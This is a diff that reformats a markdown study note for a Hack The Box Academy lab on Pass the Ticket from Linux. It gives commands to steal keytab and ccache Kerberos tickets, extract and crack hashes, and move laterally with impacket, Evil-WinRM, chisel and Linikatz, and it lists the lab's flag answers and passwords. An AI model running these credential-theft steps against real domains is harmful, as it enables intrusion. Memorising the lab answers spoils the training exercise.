@@ -1,20 +1,22 @@
-# Pass the Ticket (PtT) from Linux
+# 🐧 Pass the Ticket from Linux
 
 ## 🎯 Overview
 
 **Pass the Ticket from Linux** extends Kerberos abuse techniques to Linux environments integrated with Active Directory. Unlike Windows-only attacks, Linux machines can also participate in AD domains and store Kerberos tickets that can be stolen and abused for lateral movement.
 
 ### Key Concepts
-- **Linux AD Integration** - Domain-joined Linux machines using SSSD, Winbind, or similar
-- **ccache Files** - Credential cache files storing Kerberos tickets (usually in `/tmp`)
-- **Keytab Files** - Files containing Kerberos principals and encrypted keys for authentication
-- **Cross-Platform Attacks** - Using Linux tools to attack Windows AD infrastructure
 
----
+* **Linux AD Integration** - Domain-joined Linux machines using SSSD, Winbind, or similar
+* **ccache Files** - Credential cache files storing Kerberos tickets (usually in `/tmp`)
+* **Keytab Files** - Files containing Kerberos principals and encrypted keys for authentication
+* **Cross-Platform Attacks** - Using Linux tools to attack Windows AD infrastructure
+
+***
 
 ## 🐧 Linux Active Directory Integration
 
 ### Common Integration Methods
+
 ```bash
 # Authentication services
 ✅ SSSD (System Security Services Daemon)
@@ -26,6 +28,7 @@
 ### Identifying Domain-Joined Linux Machines
 
 #### Method 1: Using realm command
+
 ```bash
 # Check if machine is domain-joined
 realm list
@@ -45,6 +48,7 @@ inlanefreight.htb
 ```
 
 #### Method 2: Process inspection
+
 ```bash
 # Look for domain integration services
 ps -ef | grep -i "winbind\|sssd"
@@ -57,6 +61,7 @@ root   2143 2140  0 Sep29 ?   00:00:03 /usr/libexec/sssd/sssd_pam
 ```
 
 #### Method 3: Configuration files
+
 ```bash
 # Check for Kerberos configuration
 cat /etc/krb5.conf
@@ -68,19 +73,22 @@ cat /etc/sssd/sssd.conf
 cat /etc/samba/smb.conf
 ```
 
----
+***
 
 ## 🔑 Keytab Files
 
 ### What are Keytab Files?
+
 **Keytab files** contain pairs of Kerberos principals and encrypted keys, allowing authentication without interactive password entry. They're commonly used for:
-- **Automated scripts** requiring Kerberos authentication
-- **Service accounts** for unattended access
-- **Computer accounts** for domain communication
+
+* **Automated scripts** requiring Kerberos authentication
+* **Service accounts** for unattended access
+* **Computer accounts** for domain communication
 
 ### Finding Keytab Files
 
 #### Search by filename pattern
+
 ```bash
 # Find files with 'keytab' in name
 find / -name "*keytab*" -ls 2>/dev/null
@@ -92,6 +100,7 @@ find / -name "*keytab*" -ls 2>/dev/null
 ```
 
 #### Search in automated scripts
+
 ```bash
 # Check crontabs for keytab usage
 crontab -l
@@ -107,6 +116,7 @@ grep -r "\.keytab" /home/ 2>/dev/null
 ### Keytab File Analysis
 
 #### Reading keytab information
+
 ```bash
 # List principals in keytab file
 klist -k -t /opt/specialfiles/carlos.keytab
@@ -119,6 +129,7 @@ KVNO Timestamp           Principal
 ```
 
 #### Using keytab for authentication
+
 ```bash
 # Check current tickets
 klist
@@ -136,6 +147,7 @@ smbclient //dc01/carlos -k -c ls
 ### Extracting Secrets from Keytab Files
 
 #### KeyTabExtract Tool
+
 ```bash
 # Download and use KeyTabExtract
 python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
@@ -153,6 +165,7 @@ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
 ```
 
 #### Hash Cracking
+
 ```bash
 # Crack NTLM hash with hashcat
 hashcat -m 1000 a738f92b3c08b424ec2d99589a9cce60 /usr/share/wordlists/rockyou.txt
@@ -164,16 +177,18 @@ hashcat -m 1000 a738f92b3c08b424ec2d99589a9cce60 /usr/share/wordlists/rockyou.tx
 su - carlos@inlanefreight.htb
 ```
 
----
+***
 
 ## 💾 ccache Files (Credential Cache)
 
 ### Understanding ccache Files
+
 **ccache files** are temporary credential caches that store active Kerberos tickets. They remain valid during user sessions and are automatically created upon domain authentication.
 
 ### Finding ccache Files
 
 #### Environment variable check
+
 ```bash
 # Check current user's ccache location
 env | grep -i krb5
@@ -184,6 +199,7 @@ KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
 ```
 
 #### Search /tmp directory
+
 ```bash
 # List all ccache files
 ls -la /tmp/krb5cc_*
@@ -197,6 +213,7 @@ ls -la /tmp/krb5cc_*
 ### Abusing ccache Files
 
 #### Root privilege requirement
+
 ```bash
 # ccache files are protected by permissions
 # Need root access to read other users' ccache files
@@ -206,6 +223,7 @@ sudo su
 ```
 
 #### Importing ccache files
+
 ```bash
 # Copy target ccache file
 cp /tmp/krb5cc_647401106_HRJDux /root/julio_ticket
@@ -220,11 +238,12 @@ klist
 smbclient //dc01/C$ -k -c ls -no-pass
 ```
 
----
+***
 
 ## 🛠️ Essential Linux Kerberos Tools
 
 ### kinit - Request tickets
+
 ```bash
 # Request TGT for user
 kinit username@DOMAIN.HTB
@@ -237,6 +256,7 @@ kinit -r 7d username@DOMAIN.HTB
 ```
 
 ### klist - List tickets
+
 ```bash
 # Show current tickets
 klist
@@ -249,6 +269,7 @@ klist -v
 ```
 
 ### kdestroy - Remove tickets
+
 ```bash
 # Destroy current ticket cache
 kdestroy
@@ -257,19 +278,21 @@ kdestroy
 kdestroy -c /path/to/ccache/file
 ```
 
----
+***
 
 ## 🌐 Using Linux Attack Tools with Kerberos
 
 ### Requirements for Remote Attacks
+
 1. **Network connectivity** to KDC/Domain Controller
-2. **DNS resolution** for domain names  
+2. **DNS resolution** for domain names
 3. **Proper /etc/hosts** entries if DNS unavailable
 4. **Proxychains setup** if attacking through pivot
 
 ### Setting up Attack Environment
 
 #### /etc/hosts configuration
+
 ```bash
 # Add domain controller entries
 cat >> /etc/hosts << EOF
@@ -279,6 +302,7 @@ EOF
 ```
 
 #### Proxychains configuration
+
 ```bash
 # Configure proxychains for SOCKS5
 cat > /etc/proxychains.conf << EOF
@@ -288,6 +312,7 @@ EOF
 ```
 
 #### Chisel tunnel setup
+
 ```bash
 # On attack host - start chisel server
 wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
@@ -302,6 +327,7 @@ c:\tools\chisel.exe client ATTACK_HOST_IP:8080 R:socks
 ### Impacket with Kerberos
 
 #### Basic usage
+
 ```bash
 # Set ccache file environment variable
 export KRB5CCNAME=/path/to/ccache/file
@@ -314,6 +340,7 @@ proxychains impacket-secretsdump dc01 -k
 ```
 
 #### Example session
+
 ```bash
 proxychains impacket-wmiexec dc01 -k
 
@@ -330,6 +357,7 @@ inlanefreight\julio
 ### Evil-WinRM with Kerberos
 
 #### Prerequisites installation
+
 ```bash
 # Install Kerberos package
 sudo apt-get install krb5-user -y
@@ -340,6 +368,7 @@ sudo apt-get install krb5-user -y
 ```
 
 #### Configuration file
+
 ```bash
 # Edit /etc/krb5.conf
 cat > /etc/krb5.conf << EOF
@@ -354,6 +383,7 @@ EOF
 ```
 
 #### Usage example
+
 ```bash
 # Set ccache environment variable
 export KRB5CCNAME=/path/to/ccache/file
@@ -366,13 +396,14 @@ inlanefreight\julio
 DC01
 ```
 
----
+***
 
 ## 🔄 Ticket Conversion (ccache ↔ kirbi)
 
 ### impacket-ticketConverter
 
 #### ccache to kirbi (Linux → Windows)
+
 ```bash
 # Convert ccache file to kirbi format
 impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
@@ -380,7 +411,8 @@ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
 # Output: julio.kirbi file for Windows use
 ```
 
-#### kirbi to ccache (Windows → Linux)  
+#### kirbi to ccache (Windows → Linux)
+
 ```bash
 # Convert kirbi file to ccache format
 impacket-ticketConverter julio.kirbi julio.ccache
@@ -392,6 +424,7 @@ export KRB5CCNAME=/path/to/julio.ccache
 #### Using converted tickets
 
 **On Windows:**
+
 ```cmd
 # Import converted kirbi with Rubeus
 C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
@@ -404,6 +437,7 @@ dir \\dc01\julio
 ```
 
 **On Linux:**
+
 ```bash
 # Use converted ccache
 export KRB5CCNAME=/path/to/converted.ccache
@@ -411,14 +445,16 @@ klist
 smbclient //dc01/julio -k -c ls
 ```
 
----
+***
 
 ## 🔍 Advanced Tool: Linikatz
 
 ### Overview
+
 **Linikatz** is a Linux equivalent of Mimikatz, designed to extract credentials from various Linux AD integration systems including FreeIPA, SSSD, Samba, and Vintella.
 
 ### Installation and usage
+
 ```bash
 # Download Linikatz
 wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
@@ -429,12 +465,14 @@ sudo ./linikatz.sh
 ```
 
 ### What Linikatz extracts
-- **Kerberos tickets** from multiple implementations
-- **Cached credentials** from SSSD
-- **Machine secrets** from Samba
-- **Various ticket formats** (ccache, keytab)
+
+* **Kerberos tickets** from multiple implementations
+* **Cached credentials** from SSSD
+* **Machine secrets** from Samba
+* **Various ticket formats** (ccache, keytab)
 
 ### Example output
+
 ```bash
 I: [sss-check] SSS AD configuration
 I: [kerberos-check] Kerberos configuration  
@@ -449,16 +487,18 @@ Valid starting       Expires              Service principal
 # Results saved in linikatz.* folder
 ```
 
----
+***
 
 ## 🎯 HTB Academy Lab Exercises
 
 ### Lab Environment
-- **Target**: Linux machine accessible via SSH port 2222
-- **Initial Access**: david@inlanefreight.htb : Password2
-- **Connection**: `ssh david@inlanefreight.htb@TARGET_IP -p 2222`
+
+* **Target**: Linux machine accessible via SSH port 2222
+* **Initial Access**: david@inlanefreight.htb : Password2
+* **Connection**: `ssh david@inlanefreight.htb@TARGET_IP -p 2222`
 
 ### Exercise 1: Initial Access
+
 **Question**: "Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory."
 
 ```bash
@@ -470,6 +510,7 @@ cat ~/flag.txt
 ```
 
 ### Exercise 2: Group Identification
+
 **Question**: "Which group can connect to LINUX01?"
 
 ```bash
@@ -483,6 +524,7 @@ permitted-groups: Linux Admins
 **Answer**: Linux Admins
 
 ### Exercise 3: Keytab Discovery
+
 **Question**: "Look for a keytab file that you have read and write access. Submit the file name as a response."
 
 ```bash
@@ -498,6 +540,7 @@ ls -la /opt/specialfiles/carlos.keytab
 **Answer**: carlos.keytab
 
 ### Exercise 4: Keytab Hash Extraction
+
 **Question**: "Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory."
 
 ```bash
@@ -517,8 +560,9 @@ su - carlos@inlanefreight.htb
 cat ~/flag.txt
 ```
 
-### Exercise 5: Service Account Discovery  
-**Question**: "Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory."
+### Exercise 5: Service Account Discovery
+
+**Question**: "Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc\_workstations and use them to authenticate via SSH. Submit the flag.txt in svc\_workstations' home directory."
 
 ```bash
 # Check Carlos' crontab
@@ -554,7 +598,8 @@ cat ~/flag.txt
 **Answer**: Password4 → SSH access → flag in home directory
 
 ### Exercise 6: Privilege Escalation
-**Question**: "Check the sudo privileges of the svc_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response."
+
+**Question**: "Check the sudo privileges of the svc\_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response."
 
 ```bash
 # Check sudo privileges
@@ -569,10 +614,11 @@ sudo su
 cat /root/flag.txt
 ```
 
-**Answer**: Ro0t_Pwn_K3yT4b
+**Answer**: Ro0t\_Pwn\_K3yT4b
 
 ### Exercise 7: ccache File Abuse
-**Question**: "Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\DC01\julio."
+
+**Question**: "Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \DC01\julio."
 
 ```bash
 # Find Julio's ccache files
@@ -594,10 +640,11 @@ smbclient //dc01/julio -k -c 'get julio.txt' -no-pass
 cat julio.txt
 ```
 
-**Answer**: JuL1()_SH@re_fl@g
+**Answer**: JuL1()\_SH@re\_fl@g
 
 ### Exercise 8: Computer Account Ticket
-**Question**: "Use the LINUX01$ Kerberos ticket to read the flag found in \\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_)."
+
+**Question**: "Use the LINUX01$ Kerberos ticket to read the flag found in \DC01\linux01. Submit the contents as your response (the flag starts with Us1nG\_)."
 
 ```bash
 # Create working directory
@@ -615,11 +662,12 @@ smbclient //dc01/linux01 -k -c 'get flag.txt' -no-pass
 cat flag.txt
 ```
 
-**Answer**: Us1nG_KeyTab_Like_@_PRO
+**Answer**: Us1nG\_KeyTab\_Like\_@\_PRO
 
 ### Key Lab Details
 
 #### Exact File Locations
+
 ```bash
 # Keytab files found
 /etc/krb5.keytab                    # Computer account (LINUX01$)
@@ -634,6 +682,7 @@ cat flag.txt
 ```
 
 #### Hash Values and Passwords
+
 ```bash
 # Carlos keytab
 NTLM HASH: a738f92b3c08b424ec2d99589a9cce60
@@ -645,6 +694,7 @@ Password: Password4
 ```
 
 #### ccache File Patterns
+
 ```bash
 # Julio's tickets (multiple files)
 krb5cc_647401106_9JBodG    # Active ticket
@@ -658,6 +708,7 @@ krb5cc_647402606
 ```
 
 #### Computer Account Authentication
+
 ```bash
 # Critical syntax - quotes are required!
 kinit 'LINUX01$@INLANEFREIGHT.HTB' -k -t /etc/krb5.keytab
@@ -667,16 +718,18 @@ kinit LINUX01$@INLANEFREIGHT.HTB -k -t /etc/krb5.keytab
 ```
 
 #### Flag Answers Summary
+
 1. **Exercise 1**: Flag in david's home directory
-2. **Exercise 2**: Linux Admins  
+2. **Exercise 2**: Linux Admins
 3. **Exercise 3**: carlos.keytab
-4. **Exercise 4**: C@rl0s_1$_H3r3
-5. **Exercise 5**: Flag in svc_workstations home
-6. **Exercise 6**: Ro0t_Pwn_K3yT4b
-7. **Exercise 7**: JuL1()_SH@re_fl@g
-8. **Exercise 8**: Us1nG_KeyTab_Like_@_PRO
+4. **Exercise 4**: C@rl0s\_1$\_H3r3
+5. **Exercise 5**: Flag in svc\_workstations home
+6. **Exercise 6**: Ro0t\_Pwn\_K3yT4b
+7. **Exercise 7**: JuL1()\_SH@re\_fl@g
+8. **Exercise 8**: Us1nG\_KeyTab\_Like\_@\_PRO
 
 ### Success Validation
+
 ```bash
 # Verify each step works
 1. SSH connections successful
@@ -692,6 +745,7 @@ kinit LINUX01$@INLANEFREIGHT.HTB -k -t /etc/krb5.keytab
 ### Optional Exercises
 
 #### Proxychains + Evil-WinRM Setup
+
 ```bash
 # Transfer ccache to attack host
 scp -P 2222 /tmp/krb5cc_647401106_XXXXXX user@attack_host:/tmp/
@@ -701,17 +755,19 @@ scp -P 2222 /tmp/krb5cc_647401106_XXXXXX user@attack_host:/tmp/
 ```
 
 #### Cross-Platform Ticket Conversion
+
 ```bash
 # Export from Windows with Mimikatz/Rubeus
 # Convert kirbi to ccache with impacket-ticketConverter
 # Use from Linux for C$ drive access
 ```
 
----
+***
 
 ## 🛡️ Detection and Defense
 
 ### Detection Indicators
+
 ```bash
 # Monitor for suspicious activities
 - Unusual kinit usage patterns
@@ -722,6 +778,7 @@ scp -P 2222 /tmp/krb5cc_647401106_XXXXXX user@attack_host:/tmp/
 ```
 
 ### Defensive Measures
+
 ```bash
 # System hardening
 ✅ Restrict keytab file permissions (600 or 640)
@@ -737,11 +794,12 @@ scp -P 2222 /tmp/krb5cc_647401106_XXXXXX user@attack_host:/tmp/
 ✅ Alert on root privilege escalations
 ```
 
----
+***
 
 ## 🔗 Related Techniques
 
 ### Attack Chain Summary
+
 ```bash
 1. Initial Access (SSH/RDP) → Linux machine discovery
 2. Domain Integration Check → realm list, ps aux
@@ -753,20 +811,21 @@ scp -P 2222 /tmp/krb5cc_647401106_XXXXXX user@attack_host:/tmp/
 ```
 
 ### Tool Comparison
-| Tool | Purpose | Requirements | Output Format |
-|------|---------|--------------|---------------|
-| **kinit** | Request tickets | Valid credentials | ccache |
-| **klist** | List tickets | Read access | Text output |
-| **KeyTabExtract** | Extract hashes | Keytab file | NTLM/AES hashes |
-| **Linikatz** | Full extraction | Root access | Multiple formats |
-| **impacket-ticketConverter** | Convert tickets | Ticket file | ccache/kirbi |
 
----
+| Tool                         | Purpose         | Requirements      | Output Format    |
+| ---------------------------- | --------------- | ----------------- | ---------------- |
+| **kinit**                    | Request tickets | Valid credentials | ccache           |
+| **klist**                    | List tickets    | Read access       | Text output      |
+| **KeyTabExtract**            | Extract hashes  | Keytab file       | NTLM/AES hashes  |
+| **Linikatz**                 | Full extraction | Root access       | Multiple formats |
+| **impacket-ticketConverter** | Convert tickets | Ticket file       | ccache/kirbi     |
+
+***
 
 ## 📚 References
 
-- **HTB Academy**: Password Attacks - Pass the Ticket from Linux
-- **KeyTabExtract**: Tool for extracting secrets from keytab files
-- **Linikatz**: Linux credential extraction tool by Cisco
-- **Impacket**: Python library for network protocol attacks
-- **Evil-WinRM**: PowerShell remoting tool with Kerberos support 
+* **HTB Academy**: Password Attacks - Pass the Ticket from Linux
+* **KeyTabExtract**: Tool for extracting secrets from keytab files
+* **Linikatz**: Linux credential extraction tool by Cisco
+* **Impacket**: Python library for network protocol attacks
+* **Evil-WinRM**: PowerShell remoting tool with Kerberos support
